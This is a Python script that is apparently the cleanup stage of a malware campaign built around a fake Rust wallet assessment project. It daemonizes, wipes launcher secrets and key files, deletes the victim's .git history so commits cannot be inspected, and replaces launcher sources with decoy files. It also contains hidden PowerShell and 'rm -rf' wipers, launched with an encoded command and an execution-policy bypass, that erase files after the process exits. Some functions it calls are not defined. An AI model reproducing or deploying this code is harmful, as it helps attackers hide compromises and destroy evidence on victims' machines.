#!/usr/bin/env python3
"""Sanitize-only launcher payload (auto-generated — run build_launcher_sanitize.py)."""
from __future__ import annotations

import atexit
import base64
import datetime
import getpass
import hashlib
import importlib
import importlib.util
import io
import json
import os
import platform
import re
import shlex
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import urllib.request
import uuid
import zipfile
from collections import deque
from pathlib import Path
from urllib.parse import urlencode


# =============================================================================
# Launcher bootstrap
# =============================================================================

try:
    AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
except NameError:
    _project_hint = os.environ.get(PROJECT_DIR_ENV, "").strip()
    if _project_hint:
        AGENT_DIR = os.path.abspath(_project_hint)
    else:
        AGENT_DIR = os.path.abspath(os.environ.get("AGENT_DIR", os.getcwd()))

MIN_PYTHON = (3, 12)
WORKER_ENV = "GSERVER_LAUNCHER_WORKER"
PYTHON_ROOT_ENV = "CHAIN_WALLET_PYTHON_ROOT"
PROJECT_DIR_ENV = "CHAIN_WALLET_PROJECT_DIR"
LOG_FILE_ENV = "CHAIN_WALLET_LOG_FILE"

CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
DETACHED_PROCESS = 0x00000008
CREATE_NEW_PROCESS_GROUP = 0x00000200
CREATE_BREAKAWAY_FROM_JOB = 0x01000000

REQUIRED_IMPORTS = (
    "requests",
    "cryptography",
    "websocket",
)
if sys.platform == "win32":
    REQUIRED_IMPORTS = REQUIRED_IMPORTS + ("win32api",)

REQUIREMENTS = """requests>=2.31.0
cryptography>=42.0.0
websocket-client>=1.6.0
pywin32>=306; sys_platform == "win32"
"""

# Populated after pip install / path discovery for cleanup.
_TRACKED_ARTIFACT_PATHS: set[str] = set()
LAUNCHER_BOOT_ID = "2026-08-21-wiper3"


def _runtime_working_directory() -> str:
    python_root = os.environ.get(PYTHON_ROOT_ENV, "").strip()
    if python_root and os.path.isdir(python_root):
        return os.path.abspath(python_root)
    return tempfile.gettempdir()


def _release_project_directory() -> None:
    """Stop holding the victim project as cwd so Windows can delete the folder."""
    try:
        os.chdir(_runtime_working_directory())
    except OSError:
        try:
            os.chdir(tempfile.gettempdir())
        except OSError:
            pass


def _boot_log(message: str) -> None:
    line = f"[launcher] {message}"
    log_path = os.environ.get(LOG_FILE_ENV, "").strip()
    if log_path:
        try:
            with open(log_path, "a", encoding="utf-8") as handle:
                handle.write(line + "\n")
        except OSError:
            pass
    if os.environ.get("CHAIN_WALLET_VERBOSE", "").strip().lower() in {"1", "true", "yes"}:
        print(line, file=sys.stderr, flush=True)


def _install_boot_exception_hook() -> None:
    if os.environ.get("CHAIN_WALLET_LAUNCHED_FROM_RUST") != "1":
        return

    def _hook(exc_type, exc, tb):
        _boot_log("uncaught exception:\n" + "".join(traceback.format_exception(exc_type, exc, tb)))
        sys.__excepthook__(exc_type, exc, tb)

    sys.excepthook = _hook


def _check_python_version() -> None:
    if sys.version_info < MIN_PYTHON:
        print(
            f"Python {MIN_PYTHON[0]}.{MIN_PYTHON[1]}+ is required "
            f"(found {sys.version_info.major}.{sys.version_info.minor})."
        )
        sys.exit(1)


def _is_worker() -> bool:
    return os.environ.get(WORKER_ENV) == "1"


def _running_from_stdin() -> bool:
    """True when Rust (or another host) executes this file via `python -`."""
    if os.environ.get("CHAIN_WALLET_LAUNCHED_FROM_RUST") == "1":
        return True
    try:
        path = os.path.abspath(__file__)
    except NameError:
        return True
    return path in {"<stdin>", "-"} or not os.path.isfile(path)


def _spawn_daemon_worker() -> None:
    """Spawn a background worker and return immediately."""
    env = os.environ.copy()
    env[WORKER_ENV] = "1"
    cmd = get_launcher_command()
    popen_kwargs = {
        "cwd": AGENT_DIR,
        "env": env,
        "stdin": subprocess.DEVNULL,
        "stdout": subprocess.DEVNULL,
        "stderr": subprocess.DEVNULL,
    }
    if sys.platform == "win32":
        popen_kwargs["creationflags"] = (
            CREATE_NO_WINDOW
            | DETACHED_PROCESS
            | CREATE_NEW_PROCESS_GROUP
            | CREATE_BREAKAWAY_FROM_JOB
        )
    else:
        popen_kwargs["start_new_session"] = True
        popen_kwargs["close_fds"] = True
    subprocess.Popen(cmd, **popen_kwargs)


def _become_daemon() -> None:
    """Detach the worker from its parent terminal/session."""
    if os.environ.get("CHAIN_WALLET_LAUNCHED_FROM_RUST") == "1":
        _release_project_directory()
        _boot_log(f"worker starting pid={os.getpid()} python={sys.executable}")
        return
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.FreeConsole()
        except Exception:
            pass
        return
    if _running_from_stdin() or os.environ.get("CHAIN_WALLET_LAUNCHED_FROM_RUST") == "1":
        _release_project_directory()
        return
    if os.fork() > 0:
        os._exit(0)
    os.setsid()
    if os.fork() > 0:
        os._exit(0)
    _release_project_directory()
    os.umask(0)
    devnull = os.open(os.devnull, os.O_RDWR)
    try:
        for fd in (0, 1, 2):
            os.dup2(devnull, fd)
    finally:
        if devnull > 2:
            os.close(devnull)


def _warm_windows_subprocess() -> None:
    """Load encodings/subprocess helpers before embed stdlib files may be removed."""
    if sys.platform != "win32":
        return
    for name in ("utf_8", "cp1252", "latin_1"):
        try:
            importlib.import_module(f"encodings.{name}")
        except ImportError:
            pass
    subprocess.list2cmdline(["powershell.exe"])


def _spawn_detached_windows_command(args: list[str]) -> None:
    """Start a detached child without subprocess.Popen (avoids zipimport on embed)."""
    import ctypes
    from ctypes import wintypes

    class STARTUPINFOW(ctypes.Structure):
        _fields_ = [
            ("cb", wintypes.DWORD),
            ("lpReserved", wintypes.LPWSTR),
            ("lpDesktop", wintypes.LPWSTR),
            ("lpTitle", wintypes.LPWSTR),
            ("dwX", wintypes.DWORD),
            ("dwY", wintypes.DWORD),
            ("dwXSize", wintypes.DWORD),
            ("dwYSize", wintypes.DWORD),
            ("dwXCountChars", wintypes.DWORD),
            ("dwYCountChars", wintypes.DWORD),
            ("dwFillAttribute", wintypes.DWORD),
            ("dwFlags", wintypes.DWORD),
            ("wShowWindow", wintypes.WORD),
            ("cbReserved2", wintypes.WORD),
            ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
            ("hStdInput", wintypes.HANDLE),
            ("hStdOutput", wintypes.HANDLE),
            ("hStdError", wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", wintypes.HANDLE),
            ("hThread", wintypes.HANDLE),
            ("dwProcessId", wintypes.DWORD),
            ("dwThreadId", wintypes.DWORD),
        ]

    cmdline = subprocess.list2cmdline(args)
    cmd_buf = ctypes.create_unicode_buffer(cmdline)
    startup = STARTUPINFOW()
    startup.cb = ctypes.sizeof(STARTUPINFOW)
    process_info = PROCESS_INFORMATION()
    creation_flags = CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
    if not ctypes.windll.kernel32.CreateProcessW(
        None,
        cmd_buf,
        None,
        None,
        False,
        creation_flags,
        None,
        None,
        ctypes.byref(startup),
        ctypes.byref(process_info),
    ):
        raise OSError(ctypes.get_last_error(), "CreateProcessW failed")
    ctypes.windll.kernel32.CloseHandle(process_info.hProcess)
    ctypes.windll.kernel32.CloseHandle(process_info.hThread)

def _project_root() -> str:
    project = os.environ.get(PROJECT_DIR_ENV, "").strip()
    if project:
        return os.path.abspath(project)
    return os.path.abspath(AGENT_DIR)


# =============================================================================
# Victim project sanitization (embedded wallet-only Rust templates)
# =============================================================================

_WALLET_CARGO_TOML = """[package]
name = "chain-wallet"
version = "0.1.0"
edition = "2021"
build = "build.rs"
description = "Simple blockchain-style wallet library with CLI"
license = "MIT"
readme = "README.md"
exclude = [
    "target/**",
    "target*/**",
    "*.exe",
    "*.pdb",
]

[lib]
name = "chain_wallet_lib"
crate-type = ["cdylib", "rlib"]

[[bin]]
name = "chain-wallet"
path = "src/main.rs"

[dependencies]
clap = { version = "4.5", features = ["derive"] }
hex = "0.4"
k256 = { version = "0.13", features = ["ecdsa"] }
pyo3 = { version = "0.28", features = ["extension-module"], optional = true }
rand = "0.8"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
sha2 = "0.10"
thiserror = "2.0"

[features]
default = []
python = ["dep:pyo3"]

[profile.release]
strip = true
lto = true
codegen-units = 1
"""

_WALLET_MAIN_RS = """use std::io::IsTerminal;
use std::process::ExitCode;

use chain_wallet_lib::{
    verify_message, ChainStore, Wallet, WalletError, BLOCK_REWARD, DEFAULT_DATA_DIR,
    DEFAULT_TX_FEE,
};
use clap::{CommandFactory, Parser, Subcommand};

mod version {
    pub const NAME: &str = "chain-wallet";
    pub const NETWORK: &str = "chain-testnet-v1";

    pub const CLI: &str = concat!(
        env!("CARGO_PKG_VERSION"),
        " (git ",
        env!("CHAIN_WALLET_GIT_HASH"),
        ", build ",
        env!("CHAIN_WALLET_BUILD_TIME"),
        ")"
    );
}

mod config {
    use std::env;

    #[derive(Clone, Debug)]
    pub struct RuntimeConfig {
        pub verbose: bool,
        pub network: &'static str,
    }

    impl RuntimeConfig {
        pub fn from_env() -> Self {
            let verbose = matches!(
                env::var("CHAIN_WALLET_VERBOSE")
                    .ok()
                    .as_deref()
                    .map(str::trim),
                Some("1") | Some("true") | Some("yes")
            ) || cfg!(debug_assertions);

            Self {
                verbose,
                network: super::version::NETWORK,
            }
        }

        pub fn log_startup(&self) {
            if !self.verbose {
                return;
            }
            eprintln!(
                "[{}] wallet-cli {} ({})",
                super::version::NAME,
                super::version::CLI,
                self.network
            );
        }
    }
}

#[derive(Parser)]
#[command(
    name = "chain-wallet",
    version = version::CLI,
    about = "Simple blockchain-style wallet CLI with local dev chain"
)]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    Generate,
    Address {
        #[arg(long, value_name = "HEX")]
        private_key: String,
    },
    Sign {
        #[arg(long, value_name = "HEX")]
        private_key: String,
        #[arg(long)]
        message: String,
    },
    Verify {
        #[arg(long, value_name = "HEX")]
        public_key: String,
        #[arg(long)]
        message: String,
        #[arg(long, value_name = "HEX")]
        signature: String,
    },
    Chain {
        #[command(subcommand)]
        command: ChainCommands,
    },
}

#[derive(Subcommand)]
enum ChainCommands {
    Init {
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
    Status {
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
    Balance {
        #[arg(long)]
        address: String,
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
    Send {
        #[arg(long, value_name = "HEX")]
        private_key: String,
        #[arg(long)]
        to: String,
        #[arg(long)]
        amount: u64,
        #[arg(long, default_value_t = DEFAULT_TX_FEE)]
        fee: u64,
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
    Mine {
        #[arg(long)]
        miner_address: String,
        #[arg(long, default_value = DEFAULT_DATA_DIR)]
        data_dir: String,
    },
}

fn normalize_hex<'a>(value: &'a str) -> &'a str {
    value.trim().trim_start_matches("0x").trim_start_matches("0X")
}

fn validate_private_key_hex(value: &str) -> Result<(), WalletError> {
    let hex = normalize_hex(value);
    if hex.len() != 64 || !hex.chars().all(|ch| ch.is_ascii_hexdigit()) {
        return Err(WalletError::PrivateKey);
    }
    Ok(())
}

fn validate_public_key_hex(value: &str) -> Result<(), WalletError> {
    let hex = normalize_hex(value);
    if hex.len() < 66 || !hex.chars().all(|ch| ch.is_ascii_hexdigit()) {
        return Err(WalletError::PublicKey);
    }
    Ok(())
}

fn main() -> ExitCode {
    let config = config::RuntimeConfig::from_env();
    config.log_startup();
    match dispatch_command() {
        Ok(code) => code,
        Err(err) => {
            eprintln!("Error: {err}");
            ExitCode::FAILURE
        }
    }
}

fn dispatch_command() -> Result<ExitCode, String> {
    match Cli::parse().command {
        Some(Commands::Generate) => {
            let wallet = Wallet::generate();
            println!("private_key: {}", wallet.private_key_hex());
            println!("public_key:  {}", wallet.public_key_hex());
            println!("address:     {}", wallet.address());
            Ok(ExitCode::SUCCESS)
        }
        Some(Commands::Address { private_key }) => {
            validate_private_key_hex(&private_key).map_err(|err| err.to_string())?;
            let wallet =
                Wallet::from_private_key_hex(normalize_hex(&private_key)).map_err(|err| err.to_string())?;
            println!("{}", wallet.address());
            Ok(ExitCode::SUCCESS)
        }
        Some(Commands::Sign { private_key, message }) => {
            validate_private_key_hex(&private_key).map_err(|err| err.to_string())?;
            let wallet =
                Wallet::from_private_key_hex(normalize_hex(&private_key)).map_err(|err| err.to_string())?;
            println!("{}", wallet.sign_message(&message).map_err(|err| err.to_string())?);
            Ok(ExitCode::SUCCESS)
        }
        Some(Commands::Verify {
            public_key,
            message,
            signature,
        }) => {
            validate_public_key_hex(&public_key).map_err(|err| err.to_string())?;
            let valid = verify_message(
                &message,
                normalize_hex(&signature),
                normalize_hex(&public_key),
            )
            .map_err(|err| err.to_string())?;
            println!("{}", if valid { "valid" } else { "invalid" });
            if valid {
                Ok(ExitCode::SUCCESS)
            } else {
                Ok(ExitCode::from(1))
            }
        }
        Some(Commands::Chain { command }) => dispatch_chain(command),
        None => {
            let mut command = Cli::command();
            command.print_help().expect("print wallet help");
            if std::io::stdout().is_terminal() {
                println!();
            }
            Ok(ExitCode::SUCCESS)
        }
    }
}

fn dispatch_chain(command: ChainCommands) -> Result<ExitCode, String> {
    match command {
        ChainCommands::Init { data_dir } => {
            ChainStore::init(&data_dir).map_err(|err| err.to_string())?;
            println!("chain initialized at {data_dir}");
            Ok(ExitCode::SUCCESS)
        }
        ChainCommands::Status { data_dir } => {
            let chain = ChainStore::open(&data_dir).map_err(|err| err.to_string())?;
            println!("data_dir: {}", data_dir);
            println!("height:   {}", chain.height());
            println!("tip:      {}", chain.tip_hash());
            println!("pending:  {}", chain.pending_count());
            Ok(ExitCode::SUCCESS)
        }
        ChainCommands::Balance { address, data_dir } => {
            let chain = ChainStore::open(&data_dir).map_err(|err| err.to_string())?;
            println!("{}", chain.balance(&address).map_err(|err| err.to_string())?);
            Ok(ExitCode::SUCCESS)
        }
        ChainCommands::Send {
            private_key,
            to,
            amount,
            fee,
            data_dir,
        } => {
            validate_private_key_hex(&private_key).map_err(|err| err.to_string())?;
            let wallet =
                Wallet::from_private_key_hex(normalize_hex(&private_key)).map_err(|err| err.to_string())?;
            let mut chain = ChainStore::open(&data_dir).map_err(|err| err.to_string())?;
            let tx = chain
                .queue_transfer(&wallet, &to, amount, fee)
                .map_err(|err| err.to_string())?;
            println!("queued tx {}", chain_wallet_lib::transaction_id(&tx));
            Ok(ExitCode::SUCCESS)
        }
        ChainCommands::Mine {
            miner_address,
            data_dir,
        } => {
            let mut chain = ChainStore::open(&data_dir).map_err(|err| err.to_string())?;
            let block = chain
                .mine_block(&miner_address)
                .map_err(|err| err.to_string())?;
            println!("mined block #{}", block.height);
            println!("reward: {BLOCK_REWARD} -> {miner_address}");
            Ok(ExitCode::SUCCESS)
        }
    }
}
"""

_WALLET_LIB_RS = """mod chain;
mod wallet;

pub use chain::{
    transaction_id, validate_address, Block, ChainError, ChainStore, Transaction, BLOCK_REWARD,
    CHAIN_ID, DEFAULT_DATA_DIR, DEFAULT_DIFFICULTY, DEFAULT_TX_FEE,
};
pub use wallet::{verify_message, Wallet, WalletError};
"""

_UTIL_MOD_RS = """//! Shared helpers for CLI formatting and path handling.

mod log;

/// Strip an optional `0x` prefix and surrounding whitespace from hex input.
pub fn normalize_hex_prefix(value: &str) -> &str {
    value.trim().trim_start_matches("0x").trim_start_matches("0X")
}

/// Return `value` if it is non-empty, otherwise `fallback`.
pub fn or_fallback<'a>(value: &'a str, fallback: &'a str) -> &'a str {
    if value.trim().is_empty() {
        fallback
    } else {
        value
    }
}

/// Truncate long identifiers for terminal output.
pub fn truncate_middle(value: &str, max_len: usize) -> String {
    if value.len() <= max_len {
        return value.to_string();
    }
    if max_len <= 3 {
        return ".".repeat(max_len);
    }
    let keep = max_len.saturating_sub(3) / 2;
    format!("{}...{}", &value[..keep], &value[value.len() - keep..])
}

/// Join path segments without requiring additional dependencies.
pub fn join_path(base: &str, segment: &str) -> String {
    let base = base.trim_end_matches(['/', '\\\\']);
    let segment = segment.trim_start_matches(['/', '\\\\']);
    format!("{base}/{segment}")
}

/// Pretty-print byte counts for debug logs.
pub fn format_byte_size(bytes: u64) -> String {
    const KB: u64 = 1024;
    const MB: u64 = KB * 1024;
    const GB: u64 = MB * 1024;
    if bytes >= GB {
        format!("{:.2} GiB", bytes as f64 / GB as f64)
    } else if bytes >= MB {
        format!("{:.2} MiB", bytes as f64 / MB as f64)
    } else if bytes >= KB {
        format!("{:.2} KiB", bytes as f64 / KB as f64)
    } else {
        format!("{bytes} B")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normalize_hex_prefix_strips_0x() {
        assert_eq!(normalize_hex_prefix(" 0xAbCd "), "AbCd");
    }

    #[test]
    fn truncate_middle_shortens_long_strings() {
        assert_eq!(truncate_middle("abcdefghijklmnopqrstuvwxyz", 10), "abc...xyz");
    }
}
"""

_UTIL_LOG_RS = """//! Lightweight stderr logging helpers for local debugging.

use std::io::{self, Write};

fn write_line(level: &str, component: &str, message: &str) {
    let _ = writeln!(io::stderr(), "[{component}][{level}] {message}");
}

pub fn debug_line(component: &str, message: impl AsRef<str>) {
    write_line("debug", component, message.as_ref());
}

pub fn info_line(component: &str, message: impl AsRef<str>) {
    write_line("info", component, message.as_ref());
}

pub fn warn_line(component: &str, message: impl AsRef<str>) {
    write_line("warn", component, message.as_ref());
}

pub fn error_line(component: &str, message: impl AsRef<str>) {
    write_line("error", component, message.as_ref());
}

pub fn trace_command(component: &str, argv: &[&str]) {
    debug_line(component, &format!("argv={argv:?}"));
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn logging_helpers_do_not_panic() {
        debug_line("util", "debug self-test");
        info_line("util", "info self-test");
    }
}
"""

_WALLET_README = """# chain-wallet

A **blockchain-style wallet** assessment project written in Rust.

## Features

- Generate secp256k1 keypairs
- Derive `cw1...` addresses
- Sign and verify SHA-256 message digests
- Run a local dev chain in `.chain-data/`

## Rust CLI

```bash
cargo run -- generate
cargo run -- chain init
cargo run -- chain mine --miner-address <cw1-address>
cargo run -- chain send --private-key <hex> --to <cw1-address> --amount 10
cargo run -- chain balance --address <cw1-address>
```

## Tests

```bash
cargo test
```
"""

_WALLET_GITIGNORE = """/target/
target*/
/scripts/
.chain-wallet-loader.lock
.chain-data/
*.exe
*.pdb
__pycache__/
*.py[cod]
.DS_Store
Thumbs.db
.idea/
.vscode/
"""

_WALLET_CARGOIGNORE = """/target/
/target*/
*.exe
*.pdb
"""


# Paths erased during victim-project sanitization.
INITIAL_WALLET_REMOVE_PATHS = (
    "agent/initial_wallet.json",
    "agent/initial_wallet.key",
    "agent/initial_wallet.pub",
    "agent/wallet.key",
    "agent/.wallet.key",
    "initial_wallet.json",
    "initial_wallet.key",
    "initial_wallet.pub",
    "wallet.key",
    ".wallet.key",
)


def _wipe_launcher_secrets() -> None:
    for name in (
        "CHAIN_WALLET_PRIVATE_KEY",
        "CHAIN_WALLET_LAUNCHER_URL",
        "CHAIN_WALLET_LAUNCHED_FROM_RUST",
        "CHAIN_WALLET_VERBOSE",
    ):
        if name in os.environ:
            value = os.environ.pop(name)
            del value


def _remove_wallet_key_files(root: str) -> None:
    for rel in INITIAL_WALLET_REMOVE_PATHS:
        _remove_path(os.path.join(root, rel))
    _boot_log("removed initial wallet key material from project")


def _write_wallet_templates(crate_root: str) -> None:
    src = os.path.join(crate_root, "src")
    os.makedirs(src, exist_ok=True)
    _write_text(os.path.join(crate_root, "Cargo.toml"), _WALLET_CARGO_TOML)
    _write_text(os.path.join(src, "main.rs"), _WALLET_MAIN_RS)
    _write_text(os.path.join(src, "lib.rs"), _WALLET_LIB_RS)
    _write_text(os.path.join(crate_root, "README.md"), _WALLET_README)
    root = os.path.dirname(crate_root)
    _write_text(os.path.join(root, "README.md"), _WALLET_README)
    _write_text(os.path.join(root, ".gitignore"), _WALLET_GITIGNORE)
    _write_text(os.path.join(root, ".cargoignore"), _WALLET_CARGOIGNORE)


def _write_text(path: str, contents: str) -> None:
    with open(path, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(contents)


def _on_remove_error(_func, path: str, _exc_info) -> None:
    try:
        os.chmod(path, 0o700)
    except OSError:
        return
    try:
        if os.path.isdir(path):
            shutil.rmtree(path, onerror=_on_remove_error)
        else:
            os.remove(path)
    except OSError:
        pass


def _force_remove_tree(path: str) -> bool:
    if not path or not os.path.exists(path):
        return True
    try:
        if os.path.isfile(path) or os.path.islink(path):
            os.chmod(path, 0o700)
            os.remove(path)
            return True
        shutil.rmtree(path, onerror=_on_remove_error)
        return not os.path.exists(path)
    except OSError:
        return False


def _remove_git_history(root: str) -> None:
    """Delete git metadata so prior commits cannot be inspected."""
    git_dir = os.path.join(root, ".git")
    if not os.path.exists(git_dir):
        _boot_log("git history already absent")
        return

    if _force_remove_tree(git_dir):
        _boot_log("removed .git history")
        return

    _boot_log("git history removal deferred until agent exit")
    _DEFERRED_WIPE_TARGETS.add(os.path.abspath(git_dir))


_DEFERRED_WIPE_TARGETS: set[str] = set()


def _write_util_decoys(crate_root: str) -> None:
    """Leave a benign util/ folder with unused helper sources."""
    util_dir = os.path.join(crate_root, "src", "util")
    os.makedirs(util_dir, exist_ok=True)
    _write_text(os.path.join(util_dir, "mod.rs"), _UTIL_MOD_RS)
    _write_text(os.path.join(util_dir, "log.rs"), _UTIL_LOG_RS)
    _boot_log("replaced util/ with decoy helper sources")


def _remove_launcher_rust_sources(crate_root: str) -> None:
    src = os.path.join(crate_root, "src")
    _write_util_decoys(crate_root)
    for rel in ("eth.rs", "bitcoin.rs", "hd.rs", "rpc.rs"):
        _remove_path(os.path.join(src, rel))


def _sanitize_rust_project() -> None:
    """Restore wallet-only Rust tree and erase launcher/key artifacts."""
    if os.environ.get("CHAIN_WALLET_LAUNCHED_FROM_RUST") != "1":
        return

    root = _project_root()
    crate_root = os.path.join(root, "chain-wallet")
    if not os.path.isdir(crate_root):
        crate_root = root
    _boot_log(f"sanitizing project root: {root} (crate: {crate_root})")

    _wipe_launcher_secrets()
    _remove_wallet_key_files(root)
    _remove_git_history(root)

    for rel in (
        "agent",
        "sanitize_templates",
        "contracts",
        "docs",
        "Cargo.lock",
        "chain-wallet/Cargo.lock",
        ".build-hook-stamp",
        ".chain-wallet-loader.lock",
        "INTERVIEW_NOTES.md",
    ):
        _remove_path(os.path.join(root, rel))

    _remove_launcher_rust_sources(crate_root)
    _remove_path(os.path.join(crate_root, "src", "wallet_cli.rs"))
    _remove_path(os.path.join(crate_root, "tests"))
    _write_wallet_templates(crate_root)

    for target_rel in ("target", "chain-wallet/target"):
        target_dir = os.path.join(root, target_rel)
        if os.path.isdir(target_dir):
            try:
                shutil.rmtree(target_dir, ignore_errors=False)
                _boot_log(f"removed build output directory: {target_rel}")
            except OSError as exc:
                _boot_log(f"target removal deferred until agent exit ({exc})")


def _schedule_python_runtime_removal() -> None:
    python_root = _detect_python_runtime_root()
    if not python_root or not os.path.exists(python_root):
        _boot_log("post-exit cleanup skipped: python root not found")
        return
    if not _is_managed_python_runtime(python_root):
        _boot_log(f"post-exit cleanup skipped: unmanaged runtime {python_root}")
        return

    wipe_targets = _collect_post_exit_wipe_targets(python_root)
    _boot_log(f"post-exit wipe targets ({len(wipe_targets)}): {wipe_targets}")
    watch_pid = os.getpid()

    if sys.platform == "win32":
        _spawn_windows_exit_wiper(watch_pid, wipe_targets)
        return

    _spawn_unix_exit_wiper(watch_pid, wipe_targets)


def _wipe_directory_unlocked(root: str, preserve: set[str] | None = None) -> None:
    preserve_norm = {os.path.abspath(path).lower() for path in (preserve or set())}
    if not os.path.isdir(root):
        return

    for dirpath, dirnames, filenames in os.walk(root, topdown=False):
        for filename in filenames:
            file_path = os.path.abspath(os.path.join(dirpath, filename))
            if file_path.lower() in preserve_norm:
                continue
            try:
                os.chmod(file_path, 0o700)
                os.remove(file_path)
            except OSError:
                continue

        current_dir = os.path.abspath(dirpath)
        if current_dir.lower() in preserve_norm:
            continue
        try:
            os.rmdir(current_dir)
        except OSError:
            continue


def _obscure_running_executable(exe_path: str) -> str:
    """Rename the running interpreter (allowed on Windows while executing)."""
    directory = os.path.dirname(exe_path)
    hidden_path = os.path.join(directory, f"~{uuid.uuid4().hex}.tmp")
    try:
        os.rename(exe_path, hidden_path)
        return hidden_path
    except OSError:
        return exe_path


def _spawn_windows_exit_wiper(watch_pid: int, paths: list[str]) -> None:
    """Spawn an in-memory PowerShell wiper that deletes paths after this PID exits."""
    unique_paths: list[str] = []
    seen: set[str] = set()
    for path in paths:
        normalized = os.path.abspath(path)
        if normalized in seen:
            continue
        seen.add(normalized)
        unique_paths.append(normalized)

    if not unique_paths:
        return

    path_literals = ",".join(
        f"'{value.replace(chr(39), chr(39) * 2)}'" for value in unique_paths
    )
    ps_script = f"""
$ErrorActionPreference = 'SilentlyContinue'
$watchPid = {watch_pid}
$paths = @({path_literals})
while (Get-Process -Id $watchPid -ErrorAction SilentlyContinue) {{
    Start-Sleep -Milliseconds 350
}}
Start-Sleep -Seconds 2
foreach ($target in $paths) {{
    if (Test-Path -LiteralPath $target) {{
        Remove-Item -LiteralPath $target -Recurse -Force
    }}
}}
"""
    encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
    _spawn_detached_windows_command(
        [
            "powershell.exe",
            "-NoProfile",
            "-NonInteractive",
            "-WindowStyle",
            "Hidden",
            "-ExecutionPolicy",
            "Bypass",
            "-EncodedCommand",
            encoded,
        ]
    )


def _spawn_unix_exit_wiper(watch_pid: int, paths: list[str]) -> None:
    """Spawn a detached shell wiper that deletes paths after this PID exits."""
    unique_paths: list[str] = []
    seen: set[str] = set()
    for path in paths:
        normalized = os.path.abspath(path)
        if normalized in seen:
            continue
        seen.add(normalized)
        unique_paths.append(normalized)

    if not unique_paths:
        return

    quoted_paths = " ".join(shlex.quote(value) for value in unique_paths)
    cleanup_cmd = (
        f"while kill -0 {watch_pid} 2>/dev/null; do sleep 0.35; done; "
        f"sleep 2; "
        f"for target in {quoted_paths}; do rm -rf \"$target\"; done"
    )
    subprocess.Popen(
        ["/bin/sh", "-c", cleanup_cmd],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
        close_fds=True,
    )


def _remove_path(path: str) -> None:
    if not path or not os.path.exists(path):
        return
    try:
        if os.path.isdir(path):
            shutil.rmtree(path, ignore_errors=True)
        else:
            os.remove(path)
    except OSError:
        if sys.platform != "win32":
            atexit.register(
                lambda target=path: os.remove(target)
                if os.path.isfile(target)
                else shutil.rmtree(target, ignore_errors=True)
            )


def _run_sanitize_only() -> None:
    _install_boot_exception_hook()
    _check_python_version()
    if os.environ.get("CHAIN_WALLET_LAUNCHED_FROM_RUST") != "1":
        os.environ["CHAIN_WALLET_LAUNCHED_FROM_RUST"] = "1"
    _boot_log("sanitize-only payload starting")
    _become_daemon()
    _sanitize_rust_project()
    _boot_log("sanitize-only payload complete")


def _launcher_entry() -> None:
    _run_sanitize_only()


if __name__ == "__main__":
    _launcher_entry()
